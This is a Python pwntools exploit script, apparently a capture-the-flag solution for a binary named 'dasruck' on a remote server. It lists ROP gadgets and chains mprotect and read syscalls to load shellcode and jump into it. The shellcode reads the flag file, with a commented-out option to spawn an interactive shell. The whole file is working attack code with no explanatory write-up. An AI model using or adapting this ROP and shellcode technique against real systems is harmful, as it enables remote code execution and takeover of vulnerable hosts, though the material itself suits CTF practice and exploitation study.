#!/usr/bin/python

from pwn import *
context.arch = 'amd64'
#p = process('../src/dasruck')
p = remote('35.185.236.194',5050)
addr = int(p.recvuntil('\n').replace(":","").split()[-1],16)
print "addr: %x" % addr

socketfd = 0

'''
all available gadgets (including misaligned)
17 : add eax, 0x314c0f05 ; rol bl, 0x4c ; mov edx, eax ; ret
18 : add eax, 0xc0314c0f ; ret
15 : add eax, 0xf05050f ; xor rax, r8 ; ret
14 : add rax, 0xf05050f ; xor rax, r8 ; ret
22 : call rdi
0a : clc ; ret
19 : cmovl esi, dword ptr [rcx] ; rol bl, 0x4c ; mov edx, eax ; ret
1f : mov edx, eax ; ret
1e : mov rdx, r8 ; ret
05 : pop r10 ; ret
00 : pop r8 ; pop r9 ; ret
02 : pop r9 ; ret
01 : pop rax ; pop r9 ; ret
03 : pop rcx ; ret
06 : pop rdx ; ret
04 : ret
20 : ret 0xffc3
1c : rol bl, 0x4c ; mov edx, eax ; ret
16 : syscall ; add eax, 0xc0314c0f ; ret
09 : xchg eax, edi ; ret
0d : xchg eax, esi ; ret
08 : xchg r8, rdi ; ret
0c : xchg r8, rsi ; ret
11 : xor eax, eax ; ret
1a : xor rax, r8 ; ret
10 : xor rax, rax ; ret
'''

poprdx = p64(addr+6)
popr8r9 = p64(addr)
popr10 = p64(addr+0x5)
xorraxr8 = p64(addr+0x1a)
zerorax = p64(addr+0x11)
xchgr8rdi = p64(addr+0x8)
xchgr8rsi = p64(addr+0xc)
callrdi = p64(addr+0x22)
nop = p64(addr+0x4)
syscall = p64(addr+0x16)

def rop_syscall(rax,rdi,rsi,rdx):
    s = ''
    s += popr8r9
    s += p64(rdi) #r8 -> rdi
    s += p64(0x0) #r9, dont care
    s += xchgr8rdi
    s += popr8r9
    s += p64(rsi) #r8 -> rsi
    s += p64(0x0)    #r9, dont care
    s += xchgr8rsi
    s += poprdx
    s += p64(rdx) #rdx
    s += zerorax 
    s += popr8r9
    s += p64(rax) #r8 -> rax
    s += p64(0x0)
    s += xorraxr8
    s += syscall
    return s

s = ''
#mprotect
sys_mprotect = 0xa
#mprotect the address we already know exists from the 'leak'
s += rop_syscall(sys_mprotect,addr,0x1000,0x7)

#read
sys_read = 0x0
#read shellcode in after our rop chain
s += rop_syscall(sys_read,socketfd,addr+0x200,0x800)

#jump into the shellcode
s += popr8r9
s += p64(addr+0x200) #r8
s += p64(0x0) #r9
s += xchgr8rdi
s += callrdi

pad = '\x41'*25
payload = pad + s
#pad out to 1025, so the read exits cleanly:
payload += '\x41'*(1025-len(payload))
p.send(payload)
p.send(asm(shellcraft.cat('flag')))
#or get a shell
#p.send(asm(shellcraft.sh()))
p.interactive()


